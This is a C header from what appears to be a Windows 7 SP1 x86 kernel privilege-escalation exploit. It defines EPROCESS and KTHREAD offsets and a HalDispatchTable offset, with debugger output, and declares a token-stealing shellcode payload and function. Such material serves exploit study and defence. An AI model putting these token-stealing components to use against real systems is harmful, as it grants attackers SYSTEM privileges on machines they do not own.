#pragma once

#include <stdio.h>

#define STR1(x) #x
#define STR(x)	STR1(x)

//
// Windows 7 SP1 x86, English
//
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

/*
 * Difference in bytes between HalpSetSystemInformation and
 * HaliQuerySystemInformation, or more formally between:
 *		diff := HalDispatchTable[2] - HalDispatchTable[1]
 *
 * 1: kd> dps poi(hal!HalDispatchTable)
 * 8292d400  00000004
 * 8292d404  82c3d8a2 hal!HaliQuerySystemInformation
 * 8292d408  82c3e1b4 hal!HalpSetSystemInformation
 *
 * 2: kd> ? 0x82c3e1b4 - 0x82c3d8a2
 * Evaluate expression: 2322 = 00000912
**/
#define HAL_THIRD_TO_SECOND_ENTRY_DIFFERENCE	0x912


#define USE_INT_3_IN_SHELLCODE

extern "C" {

	//
	// This pointer will hold address pointing at the opening four NOPS sequence
	// since GCC/G++ during optimization is cutting out some instructions of a naked function
	// and we cannot afford that.
	//
	extern void *tokenStealingPayloadRealPointer;
	extern size_t tokenStealingPayloadSize;

	void token_stealing_win7();
}


